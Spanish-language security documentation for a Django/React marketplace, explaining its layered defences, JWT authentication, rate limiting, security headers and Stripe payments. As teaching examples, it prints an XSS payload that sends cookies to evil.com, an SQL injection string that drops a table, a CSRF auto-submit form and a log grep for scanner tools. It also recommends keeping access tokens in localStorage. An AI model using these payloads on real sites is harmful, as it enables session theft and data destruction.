# 🔐 Seguridad

## Arquitectura de Seguridad

La seguridad se implementa en múltiples capas, siguiendo el principio de "defensa en profundidad":

```
┌─────────────────────────────────────────────────────────────────────────┐
│                           CAPAS DE SEGURIDAD                            │
└─────────────────────────────────────────────────────────────────────────┘

                              INTERNET
                                  │
                                  ▼
┌─────────────────────────────────────────────────────────────────────────┐
│  CAPA 1: CLOUDFLARE                                                     │
│  ─────────────────────────────────────────────────────────────────────  │
│  • DDoS Protection - Absorbe ataques de denegación de servicio         │
│  • WAF - Bloquea SQL injection, XSS, etc.                              │
│  • Bot Fight Mode - Detecta y bloquea bots maliciosos                  │
│  • Rate Limiting - Limita peticiones por IP                            │
│  • SSL/TLS - Encripta todo el tráfico                                  │
│  • Geo-blocking - Challenge a países sospechosos (no bloqueo)          │
└─────────────────────────────────────────────────────────────────────────┘
                                  │
                                  ▼
┌─────────────────────────────────────────────────────────────────────────┐
│  CAPA 2: FIREWALL (UFW)                                                 │
│  ─────────────────────────────────────────────────────────────────────  │
│  • Solo acepta conexiones de IPs de Cloudflare                         │
│  • Bloquea acceso directo a la IP del servidor                         │
│  • SSH restringido a IPs conocidas                                      │
└─────────────────────────────────────────────────────────────────────────┘
                                  │
                                  ▼
┌─────────────────────────────────────────────────────────────────────────┐
│  CAPA 3: CROWDSEC                                                       │
│  ─────────────────────────────────────────────────────────────────────  │
│  • Detección de patrones de ataque en logs                             │
│  • Bloqueo automático de IPs maliciosas                                │
│  • Base de datos colaborativa de amenazas                               │
│  • Alertas en tiempo real                                               │
└─────────────────────────────────────────────────────────────────────────┘
                                  │
                                  ▼
┌─────────────────────────────────────────────────────────────────────────┐
│  CAPA 4: NGINX                                                          │
│  ─────────────────────────────────────────────────────────────────────  │
│  • Rate limiting por endpoint                                           │
│  • Bloqueo de user agents maliciosos                                   │
│  • Bloqueo de URIs sospechosas (.env, .git, wp-admin)                  │
│  • Límite de conexiones por IP (100 máx)                               │
│  • Security headers (X-Frame-Options, CSP, etc.)                       │
└─────────────────────────────────────────────────────────────────────────┘
                                  │
                                  ▼
┌─────────────────────────────────────────────────────────────────────────┐
│  CAPA 5: DJANGO                                                         │
│  ─────────────────────────────────────────────────────────────────────  │
│  • CSRF Protection - Tokens en formularios                             │
│  • SQL Injection Prevention - ORM parametrizado                        │
│  • XSS Prevention - Escape automático en templates                     │
│  • Clickjacking Protection - X-Frame-Options                           │
│  • Password Hashing - PBKDF2 con salt                                  │
│  • JWT Authentication - Tokens firmados                                │
└─────────────────────────────────────────────────────────────────────────┘
```

## Autenticación

### JWT (JSON Web Tokens)

El sistema usa JWT para autenticación stateless:

```
┌─────────────────────────────────────────────────────────────────────────┐
│                         FLUJO DE AUTENTICACIÓN                          │
└─────────────────────────────────────────────────────────────────────────┘

1. LOGIN
   ─────────────────────────────────────────────────────────────────────
   
   Cliente                                              Servidor
      │                                                     │
      │  POST /api/auth/login/                             │
      │  {"email": "user@email.com", "password": "xxx"}    │
      │────────────────────────────────────────────────────►│
      │                                                     │
      │                    Valida credenciales              │
      │                    Genera tokens JWT                │
      │                                                     │
      │◄────────────────────────────────────────────────────│
      │  {                                                  │
      │    "access": "eyJ...",   ← Token de acceso (15min) │
      │    "refresh": "eyJ..."   ← Token de refresh (7d)   │
      │  }                                                  │
      │                                                     │


2. PETICIÓN AUTENTICADA
   ─────────────────────────────────────────────────────────────────────
   
   Cliente                                              Servidor
      │                                                     │
      │  GET /api/users/me/                                │
      │  Authorization: Bearer eyJ...                       │
      │────────────────────────────────────────────────────►│
      │                                                     │
      │                    Verifica firma JWT               │
      │                    Extrae user_id del token         │
      │                    Ejecuta la vista                 │
      │                                                     │
      │◄────────────────────────────────────────────────────│
      │  {"id": 1, "email": "user@email.com", ...}         │
      │                                                     │


3. REFRESH TOKEN
   ─────────────────────────────────────────────────────────────────────
   
   Cliente                                              Servidor
      │                                                     │
      │  POST /api/auth/token/refresh/                     │
      │  {"refresh": "eyJ..."}                             │
      │────────────────────────────────────────────────────►│
      │                                                     │
      │                    Valida refresh token             │
      │                    Genera nuevo access token        │
      │                                                     │
      │◄────────────────────────────────────────────────────│
      │  {"access": "eyJ...nuevo..."}                      │
      │                                                     │
```

### Estructura del Token JWT

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxLCJleHAiOjE3MzQ1NjQ4MDB9.firma
└──────────────────────────────────┘ └────────────────────────────────────────┘ └────┘
           HEADER                              PAYLOAD                          FIRMA
           
HEADER (Base64):
{
  "alg": "HS256",    ← Algoritmo de firma
  "typ": "JWT"       ← Tipo de token
}

PAYLOAD (Base64):
{
  "user_id": 1,              ← ID del usuario
  "exp": 1734564800,         ← Expiración (Unix timestamp)
  "iat": 1734563900,         ← Fecha de emisión
  "jti": "abc123..."         ← ID único del token
}

FIRMA:
HMACSHA256(
  base64(header) + "." + base64(payload),
  SECRET_KEY
)
```

### Almacenamiento de Tokens

```javascript
// Frontend: Almacenar tokens de forma segura

// Access token: localStorage (acceso rápido)
localStorage.setItem('nature_access_token', accessToken);

// Refresh token: httpOnly cookie (más seguro)
// Se envía automáticamente con credentials: 'include'
```

**¿Por qué esta combinación?**

| Token | Almacenamiento | Razón |
|-------|----------------|-------|
| Access | localStorage | Acceso rápido, expira en 15 min |
| Refresh | httpOnly cookie | No accesible por JavaScript, protege contra XSS |

## Protección contra Ataques

### 1. SQL Injection

**El ataque:**
```sql
-- Input malicioso en campo de búsqueda:
' OR '1'='1'; DROP TABLE users; --
```

**Protección de Django (ORM):**
```python
# ❌ VULNERABLE (nunca hacer esto):
User.objects.raw(f"SELECT * FROM users WHERE email = '{email}'")

# ✅ SEGURO (Django ORM):
User.objects.filter(email=email)
# Django genera: SELECT * FROM users WHERE email = %s
# Y pasa el valor como parámetro, no como parte del SQL
```

### 2. Cross-Site Scripting (XSS)

**El ataque:**
```html
<!-- Input malicioso en campo de nombre: -->
<script>document.location='http://evil.com/steal?cookie='+document.cookie</script>
```

**Protección de Django:**
```python
# En templates, Django escapa automáticamente:
{{ user.name }}
# Renderiza: &lt;script&gt;... (no ejecutable)

# Si necesitas HTML real (¡cuidado!):
{{ user.bio|safe }}  # Solo si confías en el contenido
```

**Protección en React:**
```jsx
// React escapa automáticamente:
<div>{userInput}</div>  // Seguro

// ❌ PELIGROSO:
<div dangerouslySetInnerHTML={{__html: userInput}} />
```

### 3. Cross-Site Request Forgery (CSRF)

**El ataque:**
```html
<!-- En sitio malicioso: -->
<form action="https://nature-marketplace.com/api/transfer/" method="POST">
  <input type="hidden" name="amount" value="1000">
  <input type="hidden" name="to" value="attacker">
</form>
<script>document.forms[0].submit();</script>
```

**Protección de Django:**
```python
# Django genera token CSRF único por sesión
# El frontend debe incluirlo en cada POST/PUT/DELETE

# En settings.py:
CSRF_COOKIE_HTTPONLY = False  # Para que JS pueda leerlo
CSRF_TRUSTED_ORIGINS = ['https://nature-marketplace.com']
```

```javascript
// Frontend: Incluir token en headers
const csrfToken = document.cookie
  .split('; ')
  .find(row => row.startsWith('csrftoken='))
  ?.split('=')[1];

fetch('/api/orders/', {
  method: 'POST',
  headers: {
    'X-CSRFToken': csrfToken,
  },
  // ...
});
```

### 4. Brute Force (Fuerza Bruta)

**El ataque:**
```
POST /api/auth/login/
{"email": "admin@site.com", "password": "password1"}
{"email": "admin@site.com", "password": "password2"}
{"email": "admin@site.com", "password": "password3"}
... (miles de intentos)
```

**Protección en Nginx:**
```nginx
# Rate limiting para endpoints de auth
location ~ ^/api/(auth|users/login|users/register)/ {
    limit_req zone=auth burst=3 nodelay;  # 5 req/min máximo
    limit_req_status 429;  # Too Many Requests
    
    proxy_pass http://backend;
}
```

**Protección en Django:**
```python
# django-axes: Bloquea después de N intentos fallidos
AXES_FAILURE_LIMIT = 5
AXES_COOLOFF_TIME = timedelta(minutes=30)
AXES_LOCKOUT_TEMPLATE = 'account_locked.html'
```

### 5. DDoS (Denegación de Servicio)

**El ataque:**
```
Miles de requests simultáneos desde múltiples IPs
→ Servidor saturado
→ Usuarios legítimos no pueden acceder
```

**Protección multinivel:**

```
┌─────────────────────────────────────────────────────────────────────────┐
│  CLOUDFLARE                                                             │
│  • Absorbe tráfico masivo (capacidad de Tbps)                          │
│  • Detecta patrones de ataque                                           │
│  • Challenge automático a tráfico sospechoso                           │
└─────────────────────────────────────────────────────────────────────────┘
                                  │
                                  ▼
┌─────────────────────────────────────────────────────────────────────────┐
│  NGINX                                                                  │
│  • limit_conn: máx 100 conexiones por IP                               │
│  • limit_req: máx 30 req/s por IP                                      │
│  • Rechaza requests que excedan límites                                │
└─────────────────────────────────────────────────────────────────────────┘
                                  │
                                  ▼
┌─────────────────────────────────────────────────────────────────────────┐
│  CROWDSEC                                                               │
│  • Detecta IPs con comportamiento anómalo                              │
│  • Bloquea automáticamente                                              │
│  • Comparte info con la comunidad                                       │
└─────────────────────────────────────────────────────────────────────────┘
```

## Rate Limiting

### Configuración por Endpoint

| Endpoint | Límite | Burst | Razón |
|----------|--------|-------|-------|
| `/api/auth/*` | 5/min | 3 | Prevenir brute force |
| `/api/*` | 10/s | 20 | Uso normal de API |
| `/` (frontend) | 30/s | 50 | Navegación normal |
| `/storage/*` | 100/s | 200 | Imágenes (sin límite estricto) |

### Implementación en Nginx

```nginx
# Definir zonas de rate limiting
limit_req_zone $binary_remote_addr zone=auth:10m rate=5r/m;
limit_req_zone $binary_remote_addr zone=api:10m rate=10r/s;
limit_req_zone $binary_remote_addr zone=general:10m rate=30r/s;

# Aplicar a endpoints
location ~ ^/api/auth/ {
    limit_req zone=auth burst=3 nodelay;
    # ...
}

location /api/ {
    limit_req zone=api burst=20 nodelay;
    # ...
}
```

**¿Qué significa `burst`?**

```
rate=10r/s burst=20 nodelay

Significa:
• Tasa sostenida: 10 requests por segundo
• Ráfaga permitida: 20 requests adicionales
• nodelay: No encolar, procesar inmediatamente

Ejemplo:
• Request 1-10: ✅ Procesados (dentro de rate)
• Request 11-30: ✅ Procesados (usando burst)
• Request 31+: ❌ Rechazados con 429
```

## Headers de Seguridad

### Configuración en Nginx

```nginx
# Prevenir clickjacking
add_header X-Frame-Options "SAMEORIGIN" always;

# Prevenir MIME sniffing
add_header X-Content-Type-Options "nosniff" always;

# Activar filtro XSS del navegador
add_header X-XSS-Protection "1; mode=block" always;

# Controlar referrer
add_header Referrer-Policy "strict-origin-when-cross-origin" always;

# Deshabilitar APIs peligrosas
add_header Permissions-Policy "geolocation=(), microphone=(), camera=()" always;
```

### Content Security Policy (CSP)

```nginx
add_header Content-Security-Policy "
  default-src 'self';
  script-src 'self' 'unsafe-inline' https://js.stripe.com;
  style-src 'self' 'unsafe-inline' https://fonts.googleapis.com;
  img-src 'self' data: https: blob:;
  font-src 'self' https://fonts.gstatic.com;
  connect-src 'self' https://api.stripe.com;
  frame-src https://js.stripe.com;
" always;
```

**¿Qué hace cada directiva?**

| Directiva | Permite |
|-----------|---------|
| `default-src 'self'` | Por defecto, solo recursos del mismo origen |
| `script-src` | JavaScript de self + Stripe |
| `style-src` | CSS de self + Google Fonts |
| `img-src` | Imágenes de cualquier HTTPS |
| `connect-src` | Fetch/XHR a self + Stripe API |
| `frame-src` | iframes solo de Stripe |

## Seguridad de Contraseñas

### Hashing con Django

```python
# Django usa PBKDF2 por defecto
# settings.py
PASSWORD_HASHERS = [
    'django.contrib.auth.hashers.PBKDF2PasswordHasher',
    'django.contrib.auth.hashers.PBKDF2SHA1PasswordHasher',
    'django.contrib.auth.hashers.Argon2PasswordHasher',
    'django.contrib.auth.hashers.BCryptSHA256PasswordHasher',
]

# Cómo se almacena:
# pbkdf2_sha256$600000$salt$hash
#     │           │      │    │
#     │           │      │    └─ Hash resultante
#     │           │      └────── Salt aleatorio
#     │           └───────────── Iteraciones
#     └───────────────────────── Algoritmo
```

### Validación de Contraseñas

```python
# settings.py
AUTH_PASSWORD_VALIDATORS = [
    {
        # Mínimo 8 caracteres
        'NAME': 'django.contrib.auth.password_validation.MinimumLengthValidator',
        'OPTIONS': {'min_length': 8}
    },
    {
        # No puede ser similar al email/username
        'NAME': 'django.contrib.auth.password_validation.UserAttributeSimilarityValidator',
    },
    {
        # No puede ser contraseña común (lista de 20,000)
        'NAME': 'django.contrib.auth.password_validation.CommonPasswordValidator',
    },
    {
        # No puede ser solo números
        'NAME': 'django.contrib.auth.password_validation.NumericPasswordValidator',
    },
]
```

## Seguridad de Pagos (Stripe)

### Principios PCI DSS

```
┌─────────────────────────────────────────────────────────────────────────┐
│                    FLUJO DE PAGO SEGURO                                 │
└─────────────────────────────────────────────────────────────────────────┘

   NUESTRO SERVIDOR                         STRIPE
         │                                     │
         │  1. Crear PaymentIntent            │
         │────────────────────────────────────►│
         │                                     │
         │◄────────────────────────────────────│
         │     client_secret                   │
         │                                     │
         │                                     │
   NAVEGADOR DEL USUARIO                       │
         │                                     │
         │  2. Usuario ingresa tarjeta        │
         │     (en iframe de Stripe)          │
         │────────────────────────────────────►│
         │                                     │
         │  Los datos de tarjeta NUNCA        │
         │  pasan por nuestro servidor        │
         │                                     │
         │◄────────────────────────────────────│
         │     Confirmación de pago            │
         │                                     │
```

**Lo que NUNCA almacenamos:**
- ❌ Número completo de tarjeta
- ❌ CVV/CVC
- ❌ Fecha de expiración completa

**Lo que SÍ almacenamos:**
- ✅ Últimos 4 dígitos (para referencia)
- ✅ Marca de tarjeta (Visa, Mastercard)
- ✅ ID de Stripe (para reembolsos)

## Auditoría y Logs

### Qué registramos

```python
# Log de seguridad en Nginx
log_format security '$time_iso8601 $remote_addr $http_cf_connecting_ip '
                    '$http_cf_ipcountry $request_method $uri '
                    '$status $body_bytes_sent "$http_user_agent" '
                    '$request_time $upstream_response_time';
```

**Ejemplo de log:**
```
2024-12-18T22:30:45 192.168.1.1 45.33.22.11 CO POST /api/auth/login/ 200 156 "Mozilla/5.0..." 0.045 0.043
```

### Análisis de logs

```bash
# Top 10 IPs con más requests
cat /var/log/nginx/security.log | awk '{print $3}' | sort | uniq -c | sort -rn | head -10

# Requests bloqueados (status 444)
grep " 444 " /var/log/nginx/access.log | wc -l

# Intentos de login fallidos
grep "POST /api/auth/login" /var/log/nginx/access.log | grep " 401 "

# User agents sospechosos
grep -E "(sqlmap|nikto|nmap)" /var/log/nginx/access.log
```

## Checklist de Seguridad

### Antes de Producción

- [ ] HTTPS habilitado (Cloudflare)
- [ ] DEBUG = False en Django
- [ ] SECRET_KEY único y seguro
- [ ] ALLOWED_HOSTS configurado
- [ ] CORS restringido a dominios conocidos
- [ ] Rate limiting activo
- [ ] Headers de seguridad configurados
- [ ] Firewall UFW activo
- [ ] CrowdSec instalado
- [ ] Backups automáticos configurados
- [ ] Logs de seguridad activos

### Mantenimiento Continuo

- [ ] Actualizar dependencias mensualmente
- [ ] Revisar logs de seguridad semanalmente
- [ ] Rotar SECRET_KEY anualmente
- [ ] Pruebas de penetración anuales
- [ ] Revisar permisos de usuarios trimestralmente
